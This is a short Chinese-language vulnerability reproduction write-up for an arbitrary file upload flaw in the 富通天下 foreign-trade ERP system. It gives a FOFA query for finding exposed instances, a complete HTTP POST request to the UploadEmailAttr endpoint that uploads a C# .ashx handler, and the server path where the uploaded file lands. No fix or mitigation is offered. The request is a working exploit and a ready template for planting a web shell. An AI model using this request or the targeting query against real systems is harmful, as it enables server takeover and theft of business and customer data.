# 富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞

# 一、漏洞简介
富通天下外贸ERP基于二维界面管理功能，用户可对客户进行精细化的服务和跟踪，客户基本情况、邮件往来样品寄送记录、报价记录、定金收款情况等，信息脉络化，外贸管理软件让您全方位俯瞰客户管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 富通天下外贸ERP

# 三、资产测绘
+ fofa`title="用户登录_富通天下外贸ERP"`
+ 特征

![1713317155013-b6ef7c19-c580-49fc-b352-d4cd4f06a47e.png](./img/9M-_KrPGGCIelEMF/1713317155013-b6ef7c19-c580-49fc-b352-d4cd4f06a47e-088702.png)

# 四、漏洞复现
```plain
POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
{
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
{
ctx.Response.Write("hello");
}
}
```

![1713317237034-4f5b8a5e-4517-4159-a8dc-98dc7538b480.png](./img/9M-_KrPGGCIelEMF/1713317237034-4f5b8a5e-4517-4159-a8dc-98dc7538b480-766000.png)

文件上传位置

```plain
/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
```

![1713317277788-4eb77664-b181-480c-9914-8a1b6082429a.png](./img/9M-_KrPGGCIelEMF/1713317277788-4eb77664-b181-480c-9914-8a1b6082429a-053808.png)



> 更新: 2024-04-17 14:59:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36>